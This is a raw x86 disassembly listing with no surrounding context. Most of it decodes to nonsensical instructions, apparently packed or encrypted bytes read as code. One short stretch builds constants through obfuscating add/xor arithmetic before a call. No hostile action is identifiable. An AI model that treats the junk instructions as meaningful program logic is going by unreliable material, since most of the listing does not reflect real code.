  41a2b9:	jl     0x41a32e
  41a2bb:	xor    esp,DWORD PTR [ecx]
  41a2bd:	cmp    BYTE PTR [eax-0x27],0x3b
  41a2c1:	pop    esp
  41a2c2:	ja     0x41a2ff
  41a2c4:	mov    esi,0x5cb45226
  41a2c9:	push   ss
  41a2ca:	add    al,0x17
  41a2cc:	mov    cl,0x94
  41a2ce:	or     al,0xa9
  41a2d0:	sub    ebp,DWORD PTR [ebp+eax*2+0x8]
  41a2d4:	push   es
  41a2d5:	rol    BYTE PTR es:[ebp-0x5785dc1b],1
  41a2dc:	fstp   DWORD PTR [edx-0x69a84f57]
  41a2e2:	jge    0x41a320
  41a2e4:	(bad)  
  41a2e5:	in     eax,0x17
  41a2e7:	outs   dx,DWORD PTR ds:[esi]
  41a2e8:	push   cs
  41a2e9:	into   
  41a2ea:	sub    eax,0xfd18223c
  41a2ef:	mov    bl,0x56
  41a2f1:	inc    esi
  41a2f2:	iret   
  41a2f3:	mov    ecx,0x58116abb
  41a2f8:	jno    0x41a2e9
  41a2fa:	push   ds
  41a2fb:	xchg   edx,eax
  41a2fc:	jns    0x41a30c
  41a2fe:	jns    0x41a281
  41a300:	mov    eax,ds:0x45b4e4bd
  41a305:	adc    DWORD PTR [eax+0x5446315f],edi
  41a30b:	sbb    al,0xff
  41a30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a30e:	mul    BYTE PTR [ebp-0x25c609d9]
  41a314:	add    BYTE PTR [edi+0x5d],al
  41a317:	jecxz  0x41a36c
  41a319:	cmp    dl,BYTE PTR [edx-0x1a5d3275]
  41a31f:	dec    esp
  41a320:	sar    ecx,1
  41a322:	cdq    
  41a323:	into   
  41a324:	add    esp,0x2ddfbdc0
  41a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a32b:	int3   
  41a32c:	clc    
  41a32d:	and    ebp,ebx
  41a32f:	xchg   DWORD PTR [edi-0x67],edx
  41a332:	xchg   esi,eax
  41a333:	cld    
  41a334:	sub    eax,0x55a2e6e7
  41a339:	or     eax,0x767a04ff
  41a33e:	mov    ecx,ebp
  41a340:	xor    BYTE PTR [eax],dh
  41a342:	push   ebx
  41a343:	jmp    0x41a325
  41a345:	cld    
  41a346:	test   eax,0xa6d805b2
  41a34b:	fmul   DWORD PTR [eax-0x309b77a5]
  41a351:	neg    DWORD PTR [eax]
  41a353:	dec    esp
  41a354:	jecxz  0x41a3a9
  41a356:	adc    ecx,DWORD PTR [eax+0x56]
  41a359:	fxtract 
  41a35b:	xlat   BYTE PTR ds:[ebx]
  41a35c:	jmp    0x2c19fe33
  41a361:	into   
  41a362:	xchg   DWORD PTR [esi+edi*1-0x5a6aa99c],eax
  41a369:	lds    edi,FWORD PTR [esi]
  41a36b:	xchg   esp,eax
  41a36c:	xor    al,0x78
  41a36e:	push   esi
  41a36f:	inc    esi
  41a370:	xchg   esi,eax
  41a371:	inc    ebx
  41a372:	and    eax,0x839185ea
  41a377:	pop    ss
  41a378:	sbb    BYTE PTR [ecx-0xb6f3950],0x1f
  41a37f:	enter  0xeb1,0xe3
  41a383:	pusha  
  41a384:	loopne 0x41a3b4
  41a386:	jbe    0x41a3ef
  41a388:	or     ecx,DWORD PTR [edi+ecx*4-0x59]
  41a38c:	add    DWORD PTR [edi+0x7b],0x470b061e
  41a393:	adc    BYTE PTR [eax-0x9],bh
  41a396:	push   cs
  41a397:	into   
  41a398:	add    al,0xcb
  41a39a:	push   esp
  41a39b:	je     0x41a36e
  41a39d:	or     eax,0xf2125820
  41a3a2:	jb     0x41a39c
  41a3a4:	xchg   esi,eax
  41a3a5:	shl    BYTE PTR [esp+ecx*1+0x75283d5f],cl
  41a3ac:	call   0x2338:0x855f324a
  41a3b3:	cmp    bh,0x64
  41a3b6:	mov    edx,0xc2652914
  41a3bb:	adc    al,dl
  41a3bd:	xor    ecx,ecx
  41a3bf:	loop   0x41a3f2
  41a3c1:	(bad)  
  41a3c2:	aad    0x1a
  41a3c4:	or     al,0xf5
  41a3c6:	fidivr DWORD PTR [edx]
  41a3c8:	xor    eax,0xef328fd8
  41a3cd:	cmp    esp,DWORD PTR [edx]
  41a3cf:	sub    al,0x87
  41a3d1:	mov    esp,0x6d2ac3b1
  41a3d6:	dec    ebx
  41a3d7:	jbe    0x41a3af
  41a3d9:	jo     0x41a36e
  41a3db:	mov    ebx,0x585ed0fb
  41a3e0:	sub    eax,0x52238ce3
  41a3e5:	or     ah,BYTE PTR [esi-0x1c]
  41a3e8:	dec    ebx
  41a3e9:	mov    ebx,eax
  41a3eb:	jge    0x41a431
  41a3ed:	loope  0x41a396
  41a3ef:	and    al,0x9b
  41a3f1:	lds    ecx,FWORD PTR [esi-0x379d531c]
  41a3f7:	les    esi,FWORD PTR [ebx]
  41a3f9:	push   ebx
  41a3fa:	xchg   edx,eax
  41a3fb:	jmp    0xb49e:0xae68ba43
  41a402:	xchg   esp,eax
  41a403:	in     al,0x3f
  41a405:	add    esp,edx
  41a407:	jbe    0x41a481
  41a409:	je     0x41a46a
  41a40b:	imul   edx,esi,0x22
  41a40e:	push   cs
  41a40f:	dec    ebp
  41a410:	jmp    0x9836ceb9
  41a415:	jno    0x41a39b
  41a417:	sub    bl,0xfb
  41a41a:	mov    BYTE PTR [ecx+ebx*1],al
  41a41d:	retf   0xcd2
  41a420:	clc    
  41a421:	pushf  
  41a422:	xor    al,bl
  41a424:	add    eax,DWORD PTR [ecx]
  41a426:	and    edx,DWORD PTR ss:[edi+0x3f]
  41a42a:	test   eax,0x35b91a7c
  41a42f:	out    0xd1,eax
  41a431:	shl    BYTE PTR [edx+0x2e],1
  41a434:	xchg   ebp,eax
  41a435:	mov    WORD PTR [edx+0x7e964610],es
  41a43b:	jge    0x41a4b2
  41a43d:	dec    esi
  41a43e:	js     0x41a497
  41a440:	lock push ss
  41a442:	and    eax,0x7c7be688
  41a447:	sbb    DWORD PTR [edx+eax*1],ecx
  41a44a:	leave  
  41a44b:	cmp    edx,DWORD PTR [esi+0xe764483]
  41a451:	loope  0x41a471
  41a453:	sub    cl,BYTE PTR [ebx]
  41a455:	cs aam 0x38
  41a458:	fld    TBYTE PTR [esi+0x941bfd0]
  41a45e:	iret   
  41a45f:	shl    ebx,0xbe
  41a462:	ins    BYTE PTR es:[edi],dx
  41a463:	sbb    eax,0x42b0b531
  41a468:	jmp    0x41a494
  41a46a:	pop    es
  41a46b:	ror    DWORD PTR [ecx+ecx*4+0x69e57b52],0x60
  41a473:	mov    bh,0xf5
  41a475:	ds out dx,eax
  41a477:	(bad)  
  41a478:	adc    eax,0x5a138291
  41a47d:	pop    edi
  41a47e:	gs push ebx
  41a480:	ja     0x41a4c1
  41a482:	ficomp WORD PTR [esi]
  41a484:	clc    
  41a485:	mov    al,ds:0x398bc83f
  41a48a:	test   DWORD PTR [ebp-0x74f91a1b],ebx
  41a490:	mov    ds:0xa34c4ed1,al
  41a495:	out    0xc1,al
  41a497:	cmp    eax,0xc8335037
  41a49c:	push   es
  41a49d:	mov    WORD PTR [edx],es
  41a49f:	mov    eax,ds:0x957bb08d
  41a4a4:	xlat   BYTE PTR ds:[ebx]
  41a4a5:	adc    DWORD PTR [ebx],0xfe8d471a
  41a4ab:	js     0x41a43c
  41a4ad:	push   esp
  41a4ae:	in     al,0x48
  41a4b0:	nop
  41a4b1:	and    al,0x61
  41a4b3:	xlat   BYTE PTR ds:[ebx]
  41a4b4:	jns    0x41a498
  41a4b6:	mov    ebp,DWORD PTR [edx+0x784be1de]
  41a4bc:	add    eax,0xdc862492
  41a4c1:	lock mov bl,0xdd
  41a4c4:	mov    ebx,0xda7abe4e
  41a4c9:	mov    dl,0xa9
  41a4cb:	push   ecx
  41a4cc:	xlat   BYTE PTR ds:[ebx]
  41a4cd:	mov    ebx,0x583ef471
  41a4d2:	cli    
  41a4d3:	arpl   WORD PTR [ecx],bx
  41a4d5:	js     0x41a484
  41a4d7:	lds    ebp,FWORD PTR [ebx]
  41a4d9:	mov    esi,0x64f457a0
  41a4de:	mov    cl,0xdc
  41a4e0:	cmc    
  41a4e1:	push   ecx
  41a4e2:	jns    0x41a51e
  41a4e4:	pop    es
  41a4e5:	(bad)  
  41a4e6:	jbe    0x41a4a3
  41a4e8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41a4ea:	push   esp
  41a4eb:	js     0x41a4bb
  41a4ed:	fld    QWORD PTR [eax]
  41a4ef:	(bad)  
  41a4f0:	and    eax,0xd3b1e09e
  41a4f5:	pop    esi
  41a4f6:	fnstsw WORD PTR [ecx-0x464650da]
  41a4fc:	sbb    DWORD PTR [ebx+0x46be801f],0xbe8f2ba
  41a506:	int    0x1f
  41a508:	xchg   esi,eax
  41a509:	mov    al,ds:0x660a967
  41a50e:	jb     0x41a4ce
  41a510:	shr    DWORD PTR [edx-0x1a],cl
  41a513:	add    BYTE PTR [edx-0x34d84efd],0xa3
  41a51a:	mov    ds:0xad17aa11,eax
  41a51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a521:	push   ebp
  41a522:	and    al,0x42
  41a524:	xchg   esp,eax
  41a525:	push   ecx
  41a526:	int3   
  41a527:	js     0x41a551
  41a529:	and    ebp,DWORD PTR [esi+0x26]
  41a52c:	aaa    
  41a52d:	repz adc al,bl
  41a530:	cmc    
  41a531:	stos   BYTE PTR es:[edi],al
  41a532:	push   cs
  41a533:	(bad)  
  41a534:	neg    BYTE PTR [ebp+edi*4+0x1b]
  41a538:	sar    DWORD PTR [ebp+0x30b57336],0x61
  41a53f:	ja     0x41a508
  41a541:	xchg   esi,eax
  41a542:	mov    ch,0x84
  41a544:	and    al,0x62
  41a546:	xchg   ecx,eax
  41a547:	add    eax,0xd525a670
  41a54c:	add    eax,0x24f599d
  41a551:	xchg   edx,eax
  41a552:	xchg   edi,eax
  41a553:	jmp    0xb7176f3e
  41a558:	aam    0x81
  41a55a:	xor    edx,DWORD PTR [edi-0x54]
  41a55d:	fdiv   QWORD PTR [ecx+esi*2-0x68fa926e]
  41a564:	inc    esp
  41a565:	or     BYTE PTR [ebp+0x4f76f24b],bh
  41a56b:	sub    eax,0x1825d58b
  41a570:	dec    ebx
  41a571:	fist   WORD PTR [eax-0x7b]
  41a574:	mov    edx,0x84793742
  41a579:	push   ss
  41a57a:	ss pop eax
  41a57c:	fstp   DWORD PTR [ebx+0x23]
  41a57f:	clc    
  41a580:	jbe    0x41a5c2
  41a582:	xchg   ebx,eax
  41a583:	loope  0x41a540
  41a585:	ret    0x8ee4
  41a588:	aad    0x75
  41a58a:	jmp    0x41a5c6
  41a58c:	ja     0x41a527
  41a58e:	scas   al,BYTE PTR es:[edi]
  41a58f:	in     al,0xd8
  41a591:	adc    DWORD PTR ds:[edx],0x15
  41a595:	push   esi
  41a596:	xchg   ecx,eax
  41a597:	jp     0x41a5d0
  41a599:	pop    eax
  41a59a:	dec    ebp
  41a59b:	xor    eax,0x3b2ba903
  41a5a0:	in     al,0xfb
  41a5a2:	ret    
  41a5a3:	ja     0x41a528
  41a5a5:	or     eax,0x69aa3270
  41a5aa:	dec    edx
  41a5ab:	test   eax,0x38813f87
  41a5b0:	pusha  
  41a5b1:	or     eax,0x22df91cc
  41a5b6:	call   0xf47f:0xb1e27a1f
  41a5bd:	call   0xedba7723
  41a5c2:	add    bl,BYTE PTR [edx]
  41a5c4:	imul   DWORD PTR [edi-0x29fd33d3]
  41a5ca:	add    DWORD PTR [ecx+0x49],0x46
  41a5ce:	sub    BYTE PTR [ecx+edx*8],cl
  41a5d1:	rcr    DWORD PTR [ebp+0x36],0xc1
  41a5d5:	and    edx,DWORD PTR [ecx+eax*1+0x68]
  41a5d9:	jb     0x41a5a5
  41a5db:	mov    cl,0x31
  41a5dd:	fs sub al,0x77
  41a5e0:	mov    esp,0x5dddc72e
  41a5e5:	mov    ah,0xd6
  41a5e7:	mul    DWORD PTR [ebx-0x2a]
  41a5ea:	enter  0x6a80,0x81
  41a5ee:	ja     0x41a5bb
  41a5f0:	xchg   ebx,eax
  41a5f1:	repnz loop 0x41a5f6
  41a5f4:	pop    esp
  41a5f5:	cdq    
  41a5f6:	ins    DWORD PTR es:[edi],dx
  41a5f7:	imul   edi,ebp,0xe2d9ef9a
  41a5fd:	pusha  
  41a5fe:	adc    edx,DWORD PTR [edi+0x1644301]
  41a604:	ret    
  41a605:	ds test eax,0x5d81743
  41a60b:	and    DWORD PTR [eax+0x18854160],eax
  41a611:	xchg   ecx,eax
  41a612:	outs   dx,BYTE PTR ds:[esi]
  41a613:	fsub   DWORD PTR [esi+edx*1+0x4f]
  41a617:	std    
  41a618:	pop    ds
  41a619:	mov    ecx,0x705a1bca
  41a61e:	(bad)  
  41a61f:	sahf   
  41a620:	jb     0x41a5bb
  41a622:	cdq    
  41a623:	jno    0x41a664
  41a625:	lock mov dh,0x62
  41a628:	scas   eax,DWORD PTR es:[edi]
  41a629:	std    
  41a62a:	dec    ecx
  41a62b:	dec    edx
  41a62c:	xor    bh,bh
  41a62e:	stos   BYTE PTR es:[edi],al
  41a62f:	ins    DWORD PTR es:[edi],dx
  41a630:	pop    ecx
  41a631:	adc    esp,DWORD PTR [eax+0x47]
  41a634:	jns    0x41a622
  41a636:	or     BYTE PTR [ecx+0x176088e8],al
  41a63c:	fistp  QWORD PTR ds:0x6db9595c
  41a642:	and    ecx,ebx
  41a644:	int    0xdd
  41a646:	lds    ebx,FWORD PTR [eax+0x66]
  41a649:	jmp    0xbb8f:0x4f8e3d7f
  41a650:	pushf  
  41a651:	adc    DWORD PTR [edi-0x72],edx
  41a654:	pop    edx
  41a655:	pushf  
  41a656:	not    DWORD PTR [ebp+0x55]
  41a659:	inc    eax
  41a65a:	leave  
  41a65b:	jae    0x41a5ed
  41a65d:	dec    esi
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x4220c5
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	call   0x16a5:0xcfaa14e8
  41a74f:	sbb    BYTE PTR [edx+edx*1+0x20791818],bh
  41a756:	add    BYTE PTR [ecx],ch
  41a758:	ja     0x41a788
  41a75a:	sub    ebx,DWORD PTR [ebp-0x5d]
  41a75d:	adc    esi,DWORD PTR [edi+0x1cf2f480]
  41a763:	mov    ah,0xe
  41a765:	shl    BYTE PTR [ebp-0x3d],0x56
  41a769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a76a:	into   
  41a76b:	inc    ebp
  41a76c:	sbb    al,0x8b
  41a76e:	sub    DWORD PTR [edi-0x46f7c3cb],ecx
  41a774:	sub    ch,dh
  41a776:	popa   
  41a777:	inc    esi
  41a778:	int3   
  41a779:	aas    
  41a77a:	sub    esp,DWORD PTR [edx]
  41a77c:	icebp  
  41a77d:	in     al,dx
  41a77e:	rol    ebx,0x98
  41a781:	and    esi,ebx
  41a783:	ins    BYTE PTR es:[edi],dx
  41a784:	jle    0x41a715
  41a786:	jl     0x41a793
  41a788:	or     eax,0x462779f6
  41a78d:	aam    0x11
  41a78f:	out    dx,eax
  41a790:	retf   
  41a791:	ret    0x76d3
  41a794:	pusha  
  41a795:	jge    0x41a80b
  41a797:	and    al,0x62
  41a799:	inc    ecx
  41a79a:	adc    eax,0x6e4462b9
  41a79f:	push   ss
  41a7a0:	push   ss
  41a7a1:	dec    edi
  41a7a2:	sub    BYTE PTR [eax-0x5b274f4b],bl
  41a7a8:	in     al,dx
  41a7a9:	mov    eax,0xef90a19
  41a7ae:	jg     0x41a7aa
  41a7b0:	fsubr  QWORD PTR gs:[esi+0x6d682561]
  41a7b7:	sbb    DWORD PTR [esi-0x61],ecx
  41a7ba:	(bad)
  41a7bd:	in     eax,0x2d
  41a7bf:	jle    0x41a767
  41a7c1:	test   eax,0x2448161b
  41a7c6:	out    dx,eax
  41a7c7:	retf   0xf49f
  41a7ca:	jnp    0x41a75e
  41a7cc:	loope  0x41a810
  41a7ce:	stc    
  41a7cf:	(bad)  
  41a7d0:	ins    BYTE PTR es:[edi],dx
  41a7d1:	or     BYTE PTR [esi],0xe9
  41a7d4:	(bad)  
  41a7d5:	xor    edx,eax
  41a7d7:	stos   BYTE PTR es:[edi],al
  41a7d8:	retf   0xdc73
  41a7db:	mov    esp,edx
  41a7dd:	outs   dx,DWORD PTR ds:[esi]
  41a7de:	test   DWORD PTR [esp+edi*4],esi
  41a7e1:	idiv   BYTE PTR [edi]
  41a7e3:	pop    ss
  41a7e4:	inc    ebx
  41a7e5:	sahf   
  41a7e6:	jno    0x41a81d
  41a7e8:	add    al,0xf
  41a7ea:	imul   ecx,edi,0xffffffd9
  41a7ed:	push   0x23
  41a7ef:	mov    ds:0xbc9f2d72,al
  41a7f4:	jl     0x41a839
  41a7f6:	fisttp QWORD PTR [ebx]
  41a7f8:	jmp    0xfe37:0xca78b1a
  41a7ff:	jg     0x41a7a3
  41a801:	push   cs
  41a802:	add    DWORD PTR [eax+0x586fa6d7],ebx
  41a808:	and    al,0xb
  41a80a:	push   0x25
  41a80c:	cmp    edi,DWORD PTR [edi-0x5f]
  41a80f:	or     bh,BYTE PTR [edi+0x58]
  41a812:	rcl    ah,1
  41a814:	stc    
  41a815:	inc    ecx
  41a816:	fnsave [edx+0x6e]
  41a819:	dec    edx
  41a81a:	rol    DWORD PTR [ebp+0x5fda7a32],0xef
  41a821:	add    al,BYTE PTR [eax+0x7077fe20]
  41a827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a828:	mov    al,BYTE PTR [ebx+0xd3b6fb4]
  41a82e:	push   esp
  41a82f:	dec    esp
  41a830:	mov    esp,0x713642ee
  41a835:	daa    
  41a836:	js     0x41a853
  41a838:	cwde   
  41a839:	xchg   edi,eax
  41a83a:	add    ecx,eax
  41a83c:	xlat   BYTE PTR ds:[ebx]
  41a83d:	int3   
  41a83e:	cmp    BYTE PTR [edx],dl
  41a840:	add    dh,BYTE PTR [ebp+0x7bd7653f]
  41a846:	xchg   BYTE PTR [edi],ah
  41a848:	repz ror esi,1
  41a84b:	popf   
  41a84c:	xchg   ecx,eax
  41a84d:	mov    ah,0x30
  41a84f:	mov    ebx,0x9b3636b5
  41a854:	rcl    DWORD PTR [esi-0x5648aaea],cl
  41a85a:	cwde   
  41a85b:	pusha  
  41a85c:	(bad)  
  41a85d:	mov    ecx,0x877470b
  41a862:	nop
  41a863:	test   DWORD PTR [esi+0x1f],ebx
  41a866:	adc    bl,ah
  41a868:	aas    
  41a869:	pushf  
  41a86a:	or     al,0xe
  41a86c:	add    al,0xf5
  41a86e:	inc    esi
  41a86f:	test   al,0xfa
  41a871:	out    0x29,al
  41a873:	jp     0x41a8b3
  41a875:	sbb    bl,BYTE PTR [esi]
  41a877:	add    al,0x36
  41a879:	mov    ch,0xa
  41a87b:	or     BYTE PTR [ebx+0x27388519],dh
  41a881:	loope  0x41a8e3
  41a883:	in     eax,0xb2
  41a885:	out    dx,eax
  41a886:	iret   
  41a887:	push   0x8a397f4b
  41a88c:	mov    ch,0x32
  41a88e:	sub    BYTE PTR [eax+0x50],dl
  41a891:	lods   eax,DWORD PTR ds:[esi]
  41a892:	ror    DWORD PTR [esi],cl
  41a894:	push   cs
  41a895:	sbb    DWORD PTR [esi-0x263a6103],ebp
  41a89b:	push   ds
  41a89c:	sbb    DWORD PTR [ecx-0x6],0xffffff9e
  41a8a0:	xchg   esp,eax
  41a8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8a2:	and    al,BYTE PTR [edi+edx*2]
  41a8a5:	call   0xe31a:0xea79c974
  41a8ac:	int3   
  41a8ad:	data16 jge 0x41a85d
  41a8b0:	pop    esp
  41a8b1:	dec    edi
  41a8b2:	mov    eax,ds:0xebcb64ea
  41a8b7:	loop   0x41a8dd
  41a8b9:	aam    0x70
  41a8bb:	sbb    dh,cl
  41a8bd:	fbstp  TBYTE PTR [ebp-0x12c99fd0]
  41a8c3:	repnz push edx
  41a8c5:	cmc    
  41a8c6:	sub    bl,dh
  41a8c8:	dec    ebx
  41a8c9:	pop    edi
  41a8ca:	sahf   
  41a8cb:	and    eax,0xabc84706
  41a8d0:	or     esp,DWORD PTR [edi]
  41a8d2:	mov    dl,0x49
  41a8d4:	aas    
  41a8d5:	jmp    0x63d7:0x568b2c7e
  41a8dc:	jns    0x41a882
  41a8de:	shl    DWORD PTR [ebx+edi*4],0xe7
  41a8e2:	rcl    BYTE PTR [edi-0x3b7549dc],0x43
  41a8e9:	lods   eax,DWORD PTR ds:[esi]
  41a8ea:	jo     0x41a909
  41a8ec:	(bad)  
  41a8ee:	adc    al,0xed
  41a8f0:	cmp    BYTE PTR [edi+0x77b10cdc],0x13
  41a8f7:	jg     0x41a88f
  41a8f9:	xchg   ebp,eax
  41a8fa:	push   edi
  41a8fb:	push   es
  41a8fc:	pop    edx
  41a8fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8fe:	xchg   ebx,eax
  41a8ff:	sub    eax,0x17ba86d
  41a904:	repnz int 0xf1
  41a907:	push   esi
  41a908:	sub    BYTE PTR [edx-0x4d],bl
  41a90b:	stc    
  41a90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a90d:	ret    0x1d91
  41a910:	(bad)  
  41a911:	inc    eax
  41a913:	adc    esi,DWORD PTR ds:0x75e19ec5
  41a919:	mov    ds:0x3b7cc30f,al
  41a91e:	daa    
  41a91f:	dec    ebp
  41a920:	sub    eax,0x30129c17
  41a925:	imul   BYTE PTR [edi+0x6936a8c4]
  41a92b:	cmp    DWORD PTR [ebx-0x42a954a7],ebp
  41a931:	sbb    eax,0x8e30124d
  41a936:	and    al,0x92
  41a938:	xchg   ebp,eax
  41a939:	hlt    
  41a93a:	cs dec esi
  41a93c:	inc    ebx
  41a93d:	adc    ch,cl
  41a93f:	stos   DWORD PTR es:[edi],eax
  41a940:	retf   0x369a
  41a943:	cwde   
  41a944:	fadd   DWORD PTR [edi]
  41a946:	cld    
  41a947:	mov    DWORD PTR [eax+0x6f],ebp
  41a94a:	pop    ecx
  41a94b:	lahf   
  41a94c:	jne    0x41a99b
  41a94e:	call   0xccf05a2f
  41a953:	pop    ecx
  41a954:	xchg   edi,eax
  41a955:	imul   BYTE PTR [eax]
  41a957:	jns    0x41a964
  41a959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a95a:	pop    ss
  41a95b:	popf   
  41a95c:	adc    al,0x9c
  41a95e:	xrelease xchg BYTE PTR [ebx],dh
  41a961:	jle    0x41a9d1
  41a963:	mov    DWORD PTR [esi-0x300f91f7],edx
  41a969:	repz retf 0x11f4
  41a96d:	fcomp  QWORD PTR [edx]
  41a96f:	xchg   ecx,eax
  41a970:	fnstsw WORD PTR [edi]
  41a972:	je     0x41a966
  41a974:	inc    edx
  41a975:	out    0xa1,al
  41a977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a978:	repz fucom st(5)
  41a97b:	fimul  WORD PTR [edi-0x3c]
  41a97e:	in     eax,0xa9
  41a980:	xchg   ebx,eax
  41a981:	shl    edi,cl
  41a983:	xor    eax,ebp
  41a985:	scas   eax,DWORD PTR es:[edi]
  41a986:	dec    ebx
  41a987:	jp     0x41a99d
  41a989:	ret    0x49a1
  41a98c:	push   edx
  41a98d:	lahf   
  41a98e:	adc    bh,0x70
  41a991:	push   ebp
  41a992:	push   esi
  41a993:	(bad)  
  41a994:	adc    edi,eax
  41a996:	mov    ebx,0x5ddbb05b
  41a99b:	pop    ebx
  41a99c:	mov    eax,0x7078405
  41a9a1:	lahf   
  41a9a2:	stc    
  41a9a3:	sti    
  41a9a4:	mov    ds:0x89ea662a,eax
  41a9a9:	mov    esp,0xfb220040
  41a9ae:	mov    dl,0x1f
  41a9b0:	int3   
  41a9b1:	stos   BYTE PTR es:[edi],al
  41a9b2:	les    ebp,FWORD PTR [eax+ecx*2+0xb1be7f0]
  41a9b9:	test   BYTE PTR [esi+ebx*1-0x7d],dl
  41a9bd:	xor    esi,DWORD PTR [edx-0x5d2b10d0]
  41a9c3:	push   ebx
  41a9c4:	leave  
  41a9c5:	je     0x41a9b1
  41a9c7:	aam    0x75
  41a9c9:	scas   eax,DWORD PTR es:[edi]
  41a9ca:	and    BYTE PTR [ebp+edi*2-0x21706f1b],dl
  41a9d1:	retf   
  41a9d2:	lods   al,BYTE PTR ds:[esi]
  41a9d3:	and    edx,DWORD PTR [ebx+edx*2]
  41a9d6:	jno    0x41a974
  41a9d8:	jge    0x41a98e
  41a9da:	push   edx
  41a9db:	cli    
  41a9dc:	stc    
  41a9dd:	jmp    0x26650930
  41a9e2:	int    0x9b
  41a9e4:	popa   
  41a9e5:	call   0xfc40:0x908a3efb
  41a9ec:	out    0x67,eax
  41a9ee:	sub    BYTE PTR [ebx-0x33],0xf7
  41a9f2:	jb     0x41aa0c
  41a9f4:	clc    
  41a9f5:	sbb    eax,0x4ce56a61
  41a9fa:	sub    eax,0x2eaf999c
  41a9ff:	pop    eax
  41aa00:	imul   edi,edx,0xffffff86
  41aa03:	cld    
  41aa04:	push   esp
  41aa05:	jmp    0x440e:0x4345fbd5
  41aa0c:	(bad)  
  41aa0d:	push   0x3dfdeffc
  41aa12:	pop    ecx
  41aa13:	mov    dl,0xe6
  41aa15:	jne    0x41aa3b
  41aa17:	(bad)  
  41aa18:	mov    edx,DWORD PTR [edi]
  41aa1a:	cmc    
  41aa1b:	mov    esp,eax
  41aa1d:	add    eax,ebp
  41aa1f:	lods   al,BYTE PTR ds:[esi]
  41aa20:	jno    0x41aa0e
  41aa22:	dec    esi
  41aa23:	test   eax,0xc2eab95e
  41aa28:	scas   eax,DWORD PTR es:[edi]
  41aa29:	aas    
  41aa2a:	or     edx,DWORD PTR [edx-0x35ed5549]
  41aa30:	mov    al,0xf3
  41aa32:	or     DWORD PTR [ecx+0xa],esp
  41aa35:	xchg   edx,eax
  41aa36:	dec    eax
  41aa37:	mov    al,ds:0xee3cb604
  41aa3c:	mov    ch,0x6d
  41aa3e:	lods   al,BYTE PTR ds:[esi]
  41aa3f:	int    0x58
  41aa41:	call   0xc0aaba2f
  41aa46:	call   0xb26f:0xbe795e02
  41aa4d:	xlat   BYTE PTR ds:[ebx]
  41aa4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa4f:	jmp    0x41aa52
  41aa51:	dec    ebp
  41aa52:	dec    esi
  41aa53:	jb     0x41aac1
  41aa55:	data16 lods al,BYTE PTR ds:[esi]
  41aa57:	dec    esi
  41aa58:	out    dx,eax
  41aa59:	inc    edi
  41aa5a:	dec    esi
  41aa5b:	mov    al,ds:0x30709e7c
  41aa60:	ins    BYTE PTR es:[edi],dx
  41aa61:	sub    DWORD PTR [ecx-0x80],ecx
  41aa64:	dec    esi
  41aa65:	mov    edx,0x55e17ef0
  41aa6a:	mov    ds:0x5e5dbd2c,al
  41aa6f:	nop
  41aa70:	xchg   edx,eax
  41aa71:	outs   dx,DWORD PTR ds:[esi]
  41aa72:	xor    ebx,DWORD PTR [edx+0x4b]
  41aa75:	pop    ecx
  41aa76:	fs lock cwde 
  41aa79:	dec    eax
  41aa7a:	push   es
  41aa7b:	leave  
  41aa7c:	call   0xb0e4dd7
  41aa81:	push   ds
  41aa82:	fs in  al,0x9b
  41aa85:	sar    BYTE PTR [esi],0xdc
  41aa88:	dec    eax
  41aa89:	and    edx,esi
  41aa8b:	fdiv   DWORD PTR [eax+ebx*2+0x7c]
  41aa8f:	pop    ebx
  41aa90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa91:	inc    ebx
